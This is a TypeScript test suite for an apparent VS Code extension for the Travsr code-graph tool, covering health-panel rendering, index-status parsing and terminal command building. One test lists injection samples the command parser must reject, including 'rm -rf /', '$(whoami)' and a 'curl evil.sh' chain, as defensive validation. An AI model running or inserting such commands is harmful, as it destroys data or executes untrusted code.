import * as assert from "assert";
import { buildStatsHtml, computeVerdict, UNKNOWN_INDEX } from "../../webviews";
import type { Diagnostic, HealthData, IndexHealth, StatsView } from "../../webviews";
import { EMPTY_HEALTH } from "../../webviews";
import { parseIndexHealth } from "../../commands";
import {
  detectShellKind,
  formatCommandLine,
  parseTravsrInvocation,
  quoteForShell,
} from "../../terminal";

const STATS: StatsView = {
  nodes: "12,438",
  edges: "41,902",
  schemaVersion: "3",
  dbSize: "41.2 MB",
  lastIndexed: "4m ago",
};

const FRESH: IndexHealth = {
  isStale: false,
  behindBy: 0,
  indexedCommit: "a1b2c3d",
  headCommit: "a1b2c3d",
  phaseA: "done",
  workingTreeDirty: false,
  available: true,
};

const RUNNING: HealthData = { ...EMPTY_HEALTH, daemonRunning: true, mcpConnected: true };
const STOPPED: HealthData = { ...EMPTY_HEALTH, daemonRunning: false, mcpConnected: false };

/** A gather that succeeded, with one problem in each section, so a render can
 *  be checked against every branch that has something to say. */
const FULL: HealthData = {
  daemonRunning: false,
  daemonDetail: "not running",
  mcpConnected: true,
  daemonPid: "24188",
  daemonStopped: "11:38:50",
  lastEditor: "vscode-10580 detached 11:38:26",
  binaryVersion: "1.0.0",
  logFileName: "daemon.log.2026-09-02",
  logFileSize: "4 KB",
  commitHook: false,
  embedModels: [
    { id: "bge-small", description: "fast, 384 dim", installed: true, active: true, downloadMb: 133 },
    { id: "bge-base", description: "better recall", installed: false, active: false, downloadMb: 418 },
  ],
  sidecars: [
    { name: "embed", state: "not installed, semantic search off", ok: false, action: "installEmbed" },
    { name: "rerank", state: "v0.4.1, ready", ok: true, action: "reinstallEmbed" },
  ],
  agents: [
    { name: "Claude Desktop", registered: true, detail: "registered" },
    { name: "Cursor (workspace)", registered: false, detail: "not registered" },
    { name: "Continue", registered: false, detail: "config file not found" },
  ],
  repos: [
    { name: "menuservice", path: "c:/r/menuservice", exists: true },
    { name: "logrot-testrepo", path: "c:/r/logrot", exists: false },
  ],
  activeRepo: "menuservice",
  languages: [
    {
      language: "Java", analysis: "full", full: true, statusLine: "installed and enabled", flagged: true,
      installed: true, repoState: "enabled", availableHere: true, osName: "", prerequisites: "JDK + Gradle",
      builtin: false, inRepo: true, fix: "semantic", canDisable: true,
    },
    {
      language: "XML", analysis: "full", full: true, statusLine: "installed and enabled", flagged: false,
      installed: true, repoState: "always_on", availableHere: true, osName: "", prerequisites: "",
      builtin: true, inRepo: true, fix: "none", canDisable: false,
    },
    {
      language: "Go", analysis: "structural only", full: false,
      statusLine: "partial (run: travsr lang install go for full analysis)", flagged: false,
      installed: false, repoState: "not_enabled", availableHere: true, osName: "", prerequisites: "Go toolchain",
      builtin: false, inRepo: true, fix: "install", canDisable: false,
    },
  ],
  integrity: {
    healthy: false,
    ghostCount: 3,
    ghostSample: ["crates/travsr-core/src/legacy_walker.rs"],
    lexicalOk: true,
    dbSize: "28.7 MB",
    logSize: "4 KB",
    logFiles: 1,
  },
};

const STALE: IndexHealth = { ...FRESH, isStale: true, behindBy: 3, headCommit: "c40de81" };

const WARN: Diagnostic = {
  severity: "warn",
  title: "'java' analysis ran but found no symbols",
  hint: "'java' analysis ran but found no symbols, re-run `travsr init --semantic --force`",
  command: "travsr init --semantic --force",
};

suite("index status parsing", () => {
  test("an empty reply is unavailable, not fresh", () => {
    // An older binary does not serve get_index_status, and the client answers
    // "" for an unknown tool. Reading that as "not stale" would be the panel
    // asserting something it was never told.
    const h = parseIndexHealth("");
    assert.strictEqual(h.available, false);
    assert.strictEqual(h.isStale, null);
  });

  test("malformed JSON is unavailable", () => {
    assert.strictEqual(parseIndexHealth("<travsr-data>{nope</travsr-data>").available, false);
  });

  test("the envelope is stripped and the fields land", () => {
    const raw =
      "<travsr-data>" +
      JSON.stringify({
        indexed_commit: "a1b2c3d",
        head_commit: "c40de81",
        staleness: { behind_by: 3, is_stale: true, working_tree_dirty: true },
        phase_a: { state: "done" },
      }) +
      "</travsr-data>";
    const h = parseIndexHealth(raw);
    assert.strictEqual(h.available, true);
    assert.strictEqual(h.isStale, true);
    assert.strictEqual(h.behindBy, 3);
    assert.strictEqual(h.indexedCommit, "a1b2c3d");
    assert.strictEqual(h.headCommit, "c40de81");
    assert.strictEqual(h.workingTreeDirty, true);
  });

  test("a null is_stale stays null rather than collapsing to false", () => {
    const raw =
      "<travsr-data>" +
      JSON.stringify({ staleness: { is_stale: null, behind_by: null } }) +
      "</travsr-data>";
    assert.strictEqual(parseIndexHealth(raw).isStale, null);
  });
});

suite("verdict", () => {
  test("a stopped daemon outranks everything else", () => {
    // Nothing below the banner is live in this state, so it has to lead even
    // when there are analyzer warnings to report as well.
    const v = computeVerdict(false, false, STALE, [WARN], true);
    assert.strictEqual(v.verdict, "offline");
    assert.strictEqual(v.headline, "Not answering");
    assert.strictEqual(v.action?.message, "startDaemon");
    assert.ok(/read from the graph on disk/.test(v.detail));
  });

  test("a stopped daemon is reported even while queries still answer", () => {
    // The regression this pins: the page read the MCP client's connection
    // state as the daemon's state. The extension spawns its own
    // `travsr mcp --stdio` child, which opens the database directly and keeps
    // answering with no daemon anywhere, so the page said "running" beside a
    // terminal saying `daemon: not running`.
    const v = computeVerdict(true, false, FRESH, [], true);
    assert.strictEqual(v.verdict, "degraded");
    assert.strictEqual(v.headline, "Not watching");
    assert.strictEqual(v.action?.message, "startDaemon");
    assert.ok(/will not refresh/.test(v.detail), v.detail);
  });

  test("no graph is its own state, not an error", () => {
    const v = computeVerdict(true, true, UNKNOWN_INDEX, [], false);
    assert.strictEqual(v.verdict, "unindexed");
    assert.strictEqual(v.action?.message, "initRepo");
  });

  test("no graph outranks a stopped daemon: the first command is init, which starts the daemon", () => {
    // A fresh checkout with nothing answering used to offer Start daemon,
    // which starts a daemon with nothing to serve and leaves `init` still to
    // do. `travsr init` is the first command in any repository.
    const v = computeVerdict(false, false, UNKNOWN_INDEX, [], false);
    assert.strictEqual(v.verdict, "unindexed");
    assert.strictEqual(v.headline, "No graph yet");
    assert.strictEqual(v.action?.message, "initRepo");
    assert.ok(/starts the daemon/.test(v.detail), v.detail);
  });

  test("staleness outranks analyzer warnings, and names both commits", () => {
    const v = computeVerdict(true, true, STALE, [WARN], true);
    assert.strictEqual(v.verdict, "stale");
    assert.strictEqual(v.action?.message, "reindex");
    assert.ok(v.detail.includes("a1b2c3d"), v.detail);
    assert.ok(v.detail.includes("3 commits"), v.detail);
  });

  test("warnings alone read as degraded, and are counted", () => {
    const v = computeVerdict(true, true, FRESH, [WARN, { ...WARN, severity: "error" }], true);
    assert.strictEqual(v.verdict, "degraded");
    assert.ok(v.detail.includes("1 error"), v.detail);
    assert.ok(v.detail.includes("1 warning"), v.detail);
    assert.strictEqual(v.action, undefined);
  });

  test("clean is healthy", () => {
    const v = computeVerdict(true, true, FRESH, [], true);
    assert.strictEqual(v.verdict, "healthy");
    assert.strictEqual(v.headline, "Healthy");
  });

  test("every verdict carries a word, so the banner colour is never the only signal", () => {
    const cases: Array<[boolean, IndexHealth, Diagnostic[], boolean]> = [
      [false, FRESH, [], true],
      [true, UNKNOWN_INDEX, [], false],
      [true, STALE, [], true],
      [true, FRESH, [WARN], true],
      [true, FRESH, [], true],
    ];
    for (const [running, idx, ds, has] of cases) {
      const v = computeVerdict(running, running, idx, ds, has);
      assert.ok(v.headline.length > 0, JSON.stringify(v));
      assert.ok(v.detail.length > 0, JSON.stringify(v));
    }
  });
});

suite("health panel rendering", () => {
  test("the stale tile says stale rather than only turning amber", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, STALE, RUNNING);
    assert.ok(html.includes('class="card warn"'), "tile carries the state class");
    assert.ok(html.includes(">stale<"), "and the word beside the value");
  });

  test("a fresh index leaves the tiles unmarked", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(!html.includes('class="card warn"'));
  });

  test("the diagnostic is not printed twice", () => {
    // `title` is `hint` with the trailing "run `cmd`" clause removed, and the
    // card used to render both, so the heading read as a sentence cut off
    // mid-thought and the body repeated it in full.
    const html = buildStatsHtml(STATS, [], [WARN], 500, undefined, 0, FRESH, RUNNING);
    const first = html.indexOf("analysis ran but found no symbols");
    const second = html.indexOf("analysis ran but found no symbols", first + 1);
    assert.strictEqual(second, -1, "the sentence appears once");
  });

  test("a fix offers Run and Copy, and the command text never reaches the click handler", () => {
    const html = buildStatsHtml(STATS, [], [WARN], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(html.includes("runFix(this, 0)"), "Run posts an index");
    assert.ok(html.includes("copyFix(this, 0)"), "Copy posts an index");
    assert.ok(
      !html.includes("runFix(this, 'travsr"),
      "no command text is inlined into an onclick"
    );
  });

  test("an unavailable index status says so instead of rendering gaps as answers", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, UNKNOWN_INDEX, RUNNING);
    assert.ok(html.includes("not reported by this binary"));
  });

  test("a missing index status blames the right thing", () => {
    // An empty reply is not evidence about the binary's age when Travsr is not
    // answering, or when the daemon is stopped. Saying "not reported by this
    // binary" there sends the reader to check the wrong thing.
    const offline = buildStatsHtml(STATS, [], [], 500, undefined, 0, UNKNOWN_INDEX, STOPPED);
    assert.ok(offline.includes("Travsr is not answering"), offline.slice(0, 0) || "offline reason");
    const noDaemon = buildStatsHtml(STATS, [], [], 500, undefined, 0, UNKNOWN_INDEX, {
      ...RUNNING,
      daemonRunning: false,
    });
    assert.ok(noDaemon.includes("while the daemon is stopped"), "stopped-daemon reason");
    assert.ok(!noDaemon.includes("not reported by this binary"), "and not the binary's age");
  });

  test("the header carries a timestamp the document can count from", () => {
    // "checked just now" was a literal, so it never changed and a Refresh on an
    // otherwise unchanged page produced no visible result at all.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(/data-at="\d{13}"/.test(html), "a real epoch timestamp is rendered");
    assert.ok(html.includes("tickChecked"), "and the document ticks it");
  });

  test("being unable to query is stated, not implied by the numbers being old", () => {
    // STOPPED is both: no daemon and no answers. The banner has to say the
    // numbers came off disk rather than leaving the reader to infer it.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, STOPPED);
    assert.ok(html.includes("Not answering"));
    assert.ok(html.includes("read from the graph on disk"));
    assert.ok(html.includes("startDaemon"));
  });

  test("every section renders, and each is collapsible", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL, "travsr", "c:/r");
    for (const title of [
      "Daemon",
      "Index freshness",
      "Sidecars",
      "Storage and integrity",
      "Languages",
      "Agent connections",
      "Repositories",
    ]) {
      assert.ok(html.includes(`>${title}</span>`), `${title} is missing`);
    }
    // Seven sections plus Recent activity and the log keep their own <details>.
    assert.ok((html.match(/<details class="hsec" open>/g) ?? []).length === 7);
  });

  test("a section whose data could not be read says so, rather than reading as clean", () => {
    // EMPTY_HEALTH is what a failed gather looks like. Rendering that as empty
    // rows would be the page claiming there is nothing wrong.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(html.includes("Could not read the sidecar list."));
    assert.ok(html.includes("Could not read the language list."));
    assert.ok(html.includes("Could not read the repository registry."));
  });

  test("real section data lands in the rows", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("not installed, semantic search off"), "sidecar state");
    assert.ok(html.includes("structural only"), "language analysis");
    assert.ok(html.includes("config file not found"), "agent detail");
    assert.ok(html.includes("logrot-testrepo"), "repo row");
    assert.ok(html.includes("ghost path"), "integrity chip");
  });

  test("the commit hook is reported only when it was actually checked", () => {
    const unchecked = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(!unchecked.includes("Commit hook"), "null means not checked, so it is not claimed");
    const checked = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(checked.includes("Commit hook"));
    assert.ok(checked.includes("so commits do not refresh"));
  });

  test("the log row points at the reader on this page, not at the raw file", () => {
    // Opening the file in an editor was both redundant, since the Daemon log
    // section reads it with filters and a rotated-file picker, and broken: the
    // logs live in .travsr, not .travsr/logs.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("showLog()"), "the button scrolls to the log section");
    assert.ok(html.includes('id="daemonLogSection"'), "and that section is anchored");
    assert.ok(!html.includes("openLog"), "no message asks the extension to open a file");
  });

  test("the daemon section states the daemon and the queries separately", () => {
    // FULL is the real shape of the reported bug: daemon down, queries fine.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("not running"), "the daemon's own word");
    assert.ok(html.includes("answering from the graph on disk"), "queries are separate");
    assert.ok(html.includes("commits and saves will not refresh"), "and the consequence is named");
    assert.ok(!html.includes(">running</b>"), "it must not claim the daemon is up");
  });

  test("a language the CLI calls active is still flagged when a warning names it", () => {
    // `lang list` reports java as installed and enabled while `travsr status`
    // warns it resolved nothing. The table used to show a tick beside a card
    // saying the opposite.
    const html = buildStatsHtml(STATS, [], [WARN], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("see the warning below"), "the row points at the card");
    assert.ok(!html.includes("<td>resolved</td>"), "no invented symbol count");
  });

  test("the semantic tile counts languages, it does not invent a symbol total", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("1 of 3"), "a count of languages");
    assert.ok(!html.includes("0 symbols"), "never a fabricated total");
  });

  test("a language offers the fix its own status line names", () => {
    // Go is partial with no analyzer installed, so the CLI says the fix is
    // `travsr lang install go`. Offering a semantic re-index there runs the
    // wrong command and changes nothing.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("Install analyzer"), "the install fix is offered");
    assert.ok(html.includes("Re-run semantic"), "and the re-index fix where that is the fix");
    assert.ok(html.includes("fixLang(this, 2)"), "each row posts its own index");
    assert.ok(!html.includes("fixLang(this, 'go')"), "never the language name itself");
  });

  test("the Languages table keeps 'installed on this machine' apart from 'on for this repo'", () => {
    // kotlin is the case the merged table exists for: the analyzer is on the
    // machine, so an install changes nothing; what is missing is the per-repo
    // switch. The old table offered Install there.
    const rows: HealthData["languages"] = [
      {
        language: "kotlin", analysis: "structural only", full: false, statusLine: "partial", flagged: false,
        installed: true, repoState: "not_enabled", availableHere: true, osName: "", prerequisites: "JDK, Maven or Gradle",
        builtin: false, inRepo: true, fix: "enable", canDisable: false,
      },
      {
        language: "go", analysis: "structural only", full: false, statusLine: "partial", flagged: false,
        installed: false, repoState: "not_enabled", availableHere: true, osName: "", prerequisites: "Go toolchain",
        builtin: false, inRepo: true, fix: "install", canDisable: false,
      },
      {
        language: "java", analysis: "full", full: true, statusLine: "active", flagged: false,
        installed: true, repoState: "enabled", availableHere: true, osName: "", prerequisites: "JDK + Gradle",
        builtin: false, inRepo: true, fix: "none", canDisable: true,
      },
      {
        language: "ruby", analysis: "structural only", full: false, statusLine: "not available on windows", flagged: false,
        installed: false, repoState: "not_enabled", availableHere: false, osName: "Windows", prerequisites: "Ruby, Bundler",
        builtin: false, inRepo: true, fix: "none", canDisable: false,
      },
    ];
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, { ...FULL, languages: rows });
    assert.ok(html.includes("<th>Global installed</th>") && html.includes("<th>This repo</th>"), "two columns, two facts");
    assert.ok(html.includes("Enable for this repo") && html.includes("fixLang(this, 0)"), "installed but off here offers the enable, not an install");
    assert.ok(html.includes("Install analyzer") && html.includes("fixLang(this, 1)"), "not installed offers the install");
    assert.ok(html.includes("disableLang(this, 2)"), "an enabled non-builtin can be turned off");
    assert.ok(html.includes("not available on Windows"), "an unavailable language says so");
    assert.ok(!html.includes("fixLang(this, 3)"), "and is never offered an install that would dead-end");
    assert.ok(html.includes("JDK, Maven or Gradle"), "prerequisites travel with the row");
    // The Semantic tile counts only languages that can run here: ruby is a fact
    // about the platform, not a partial analysis.
    assert.ok(html.includes("1 of 3"), `tile counts the three that can run here; got ${/Semantic[\s\S]{0,200}/.exec(html)?.[0]}`);
  });

  test("a stale binary's language rows are withheld and the banner names it", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, {
      ...FULL,
      languages: null,
      languagesSkew: { missingFields: ["status", "repoState"], binary: "C:/old/travsr.exe" },
    });
    assert.ok(html.includes("older than this extension expects"), "the banner appears in the section");
    assert.ok(html.includes("C:/old/travsr.exe"), "it names the binary");
    assert.ok(html.includes("downloadBinary(") && html.includes("openBinarySetting("), "and offers both remedies");
    assert.ok(!html.includes("Could not read the language list."), "a skew is a finding, not a read failure");
  });

  test("every button on the page posts a message the panel handles", () => {
    // The Remove and Prune stale buttons were rendered here but their handlers
    // lived only in the Repos panel, so clicking them did nothing at all. This
    // pins the set of messages this page can emit against the set the
    // controller implements, so a new button cannot ship dead.
    // Rendered across the states that emit different actions, not just one.
    // The first version of this test rendered only a graph-present state, where
    // the verdict emits `reindex`, so `initRepo` never appeared in the HTML it
    // inspected and a dead primary action on the first-run page went unnoticed.
    const EMPTY_STATS: StatsView = { ...STATS, nodes: "0", edges: "0" };
    const html =
      buildStatsHtml(STATS, [], [WARN], 500, undefined, 0, STALE, FULL) +
      buildStatsHtml(EMPTY_STATS, [], [], 500, undefined, 0, UNKNOWN_INDEX, RUNNING) +
      buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING) +
      buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, STOPPED);
    const HANDLED = new Set([
      "refresh", "startDaemon", "restartDaemon", "reindex", "fullRebuild",
      "installHook", "installEmbed", "reinstallEmbed", "changeEmbedModel",
      "runFsck", "compact", "registerMcp", "prune", "remove", "fixLang", "disableLang",
      "runFix", "copyFix", "openFile", "setLogLines", "setLogFile", "setLogAuto",
      "initRepo", "detectLangs", "downloadBinary", "openBinarySetting",
    ]);
    const posted = new Set<string>();
    for (const m of html.matchAll(/command:\s*'([a-zA-Z]+)'/g)) posted.add(m[1]);
    for (const m of html.matchAll(/panelAction\(this,\s*'([a-zA-Z]+)'\)/g)) posted.add(m[1]);
    for (const m of html.matchAll(/verdictAction\(this,\s*'([a-zA-Z]+)'\)/g)) posted.add(m[1]);
    assert.ok(posted.size > 5, `expected several messages, saw ${[...posted]}`);
    for (const p of posted) {
      assert.ok(HANDLED.has(p), `${p} is posted by the page but not handled`);
    }
    // The unindexed state's primary action has to be among them, since that is
    // the one this check previously never saw.
    assert.ok(posted.has("initRepo"), "the unindexed verdict's action was rendered");

    // And the other direction, which is the half that was missing: a message
    // the controller handles but nothing posts is dead weight, and listing it
    // here actively hid it. `reindexSemantic` survived that way after the
    // panel-wide semantic reindex became the per-language fixLang button.
    //
    // Messages the log controls own are exempt: they are posted from handlers
    // this render does not inline, so their absence here says nothing.
    const LOG_OWNED = new Set(["setLogLines", "setLogFile", "setLogAuto", "openFile"]);
    for (const h of HANDLED) {
      if (LOG_OWNED.has(h)) continue;
      assert.ok(posted.has(h), `${h} is handled but no button posts it`);
    }
  });

  test("the embed row offers a model switch only when there is a choice", () => {
    const withChoice = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(withChoice.includes("Change model"), "two backends means a choice");
    // One backend, or a catalog that could not be read, is not a choice, and a
    // picker with a single entry is a dead end dressed as an option.
    const single = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, {
      ...FULL,
      embedModels: [FULL.embedModels[0]],
    });
    assert.ok(!single.includes("Change model"), "one backend offers nothing to switch to");
  });

  test("the embed action says reinstall, because that is what it does", () => {
    // `embed init --reinstall` re-downloads the binary and its model and
    // re-embeds the repository. Calling that a restart understated it.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("Reinstall"), "the label matches the command");
    assert.ok(!html.includes(">Restart</button>"), "and no longer claims a restart");
  });

  test("the unindexed verdict offers an action that indexes", () => {
    const EMPTY_STATS: StatsView = { ...STATS, nodes: "0", edges: "0" };
    const html = buildStatsHtml(EMPTY_STATS, [], [], 500, undefined, 0, UNKNOWN_INDEX, RUNNING);
    assert.ok(html.includes("No graph yet"), "the verdict is the unindexed one");
    assert.ok(html.includes("verdictAction(this, 'initRepo')"), "and it posts initRepo");
  });

  test("the logs row offers no action, because pruning them is the daemon's job", () => {
    // This button was wired to `repos --prune`, so a click beside Logs would
    // have pruned the repository registry instead.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, FULL);
    assert.ok(html.includes("pruned by the daemon"), "the row says who prunes");
    assert.ok(!html.includes("pruneLogs"), "and offers no button of its own");
  });

  test("the repository list is capped, with the live ones first", () => {
    // A machine that has run the test suite accumulates a registry entry per
    // temp repo. This reached seventy rows of .tmpXXXXXX and buried the real
    // repositories.
    const many: HealthData = {
      ...FULL,
      repos: [
        ...Array.from({ length: 68 }, (_, i) => ({
          name: `.tmp${i}`,
          path: `c:/t/${i}`,
          exists: false,
        })),
        { name: "travsr", path: "c:/r/travsr", exists: true },
        { name: "menuservice", path: "c:/r/menu", exists: true },
      ],
    };
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, many);
    assert.ok(html.includes("travsr"), "a live repo is shown");
    assert.ok(html.includes("and 62 more"), "the rest are counted, not listed");
    assert.ok(html.includes("Prune stale (68)"), "and the bulk fix is offered");
    assert.ok((html.match(/removeRepoRow\(/g) ?? []).length <= 8, "rows are capped");
  });

  test("a repo name reaches the handler as data, not as a JS string literal", () => {
    // esc() escapes for HTML, and the parser decodes the entity before the JS
    // in an onclick is parsed, so a name carrying a quote would have broken out
    // of the literal it was interpolated into.
    const awkward: HealthData = {
      ...FULL,
      repos: [{ name: "it's-gone", path: "c:/t", exists: false }],
    };
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, awkward);
    assert.ok(html.includes('data-name="it&#39;s-gone"'), "the name is an attribute");
    assert.ok(html.includes("removeRepoRow(this)"), "and the handler reads it from the element");
    assert.ok(!/removeRepoRow\(this, '/.test(html), "never interpolated into the call");
  });

  test("Refresh stays disabled until the redraw replaces the document", () => {
    // unlockButtons fires the instant the extension receives a message, before
    // any of the work. That is right for actions that leave the document
    // standing, and wrong for a redraw: it re-enabled Refresh while a render
    // that can take seconds was still running, so it could be pressed again
    // and again.
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    assert.ok(html.includes("setSticky(btn,'Refresh')"), "Refresh marks itself sticky");
    assert.ok(html.includes("if (b.dataset.sticky) return;"), "and unlockButtons skips it");
  });

  test("auto refresh is a page control, not a log control", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, FRESH, RUNNING);
    // Anchored on the heading, not the words: "Daemon log" also appears in a
    // CSS comment near the top of the document.
    const header = html.slice(0, html.indexOf("<h2>Daemon log</h2>"));
    assert.ok(header.includes('id="logAuto"'), "the Auto select sits in the page header");
    assert.ok(
      header.indexOf('id="logAuto"') > header.indexOf('id="checkedAt"'),
      "beside the checked-at counter and Refresh"
    );
    // And it says what a tick costs, rather than leaving it to be discovered.
    assert.ok(html.includes("full redraw"), "the tooltip states the cost");
  });

  test("no section signals its state by colour alone", () => {
    const html = buildStatsHtml(STATS, [], [], 500, undefined, 0, STALE, FULL);
    // Each chip tone carries a word beside it.
    for (const word of ["not running", "stale", "missing", "partial"]) {
      assert.ok(html.includes(word), `${word} is not stated`);
    }
  });
});

suite("terminal command building", () => {
  test("only a plain travsr call is accepted", () => {
    assert.deepStrictEqual(parseTravsrInvocation("travsr init --semantic --force"), [
      "init",
      "--semantic",
      "--force",
    ]);
    assert.deepStrictEqual(parseTravsrInvocation("travsr lang install java"), [
      "lang",
      "install",
      "java",
    ]);
  });

  test("anything a shell would interpret is refused rather than escaped", () => {
    for (const bad of [
      "travsr init; rm -rf /",
      "travsr $(whoami)",
      "travsr init && curl evil.sh",
      "npm i -g travsr",
      'travsr init "a b"',
      "travsr init `id`",
      "travsr init | tee out",
    ]) {
      assert.strictEqual(parseTravsrInvocation(bad), null, bad);
    }
  });

  test("the shell is classified from its basename, with a platform fallback", () => {
    assert.strictEqual(detectShellKind("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"), "powershell");
    assert.strictEqual(detectShellKind("/usr/bin/pwsh"), "powershell");
    assert.strictEqual(detectShellKind("C:\\Windows\\System32\\cmd.exe"), "cmd");
    assert.strictEqual(detectShellKind("/bin/zsh"), "posix");
    assert.strictEqual(detectShellKind("C:\\Program Files\\Git\\bin\\bash.exe"), "posix");
    assert.strictEqual(detectShellKind(undefined, "win32"), "powershell");
    assert.strictEqual(detectShellKind(undefined, "linux"), "posix");
  });

  test("a safe token is left alone, and a space is quoted per shell", () => {
    assert.strictEqual(quoteForShell("init", "posix"), "init");
    assert.strictEqual(quoteForShell("a b", "posix"), "'a b'");
    assert.strictEqual(quoteForShell("a b", "powershell"), "'a b'");
    assert.strictEqual(quoteForShell("a b", "cmd"), '"a b"');
    assert.strictEqual(quoteForShell("it's", "posix"), `'it'\\''s'`);
    assert.strictEqual(quoteForShell("it's", "powershell"), "'it''s'");
  });

  test("PowerShell gets the call operator only when the binary is quoted", () => {
    assert.strictEqual(
      formatCommandLine("C:\\Program Files\\t\\travsr.exe", ["daemon", "start"], "powershell"),
      "& 'C:\\Program Files\\t\\travsr.exe' daemon start"
    );
    assert.strictEqual(
      formatCommandLine("C:\\tools\\travsr.exe", ["daemon", "start"], "powershell"),
      "C:\\tools\\travsr.exe daemon start"
    );
    assert.strictEqual(
      formatCommandLine("/usr/bin/travsr", ["init"], "posix"),
      "/usr/bin/travsr init"
    );
  });
});
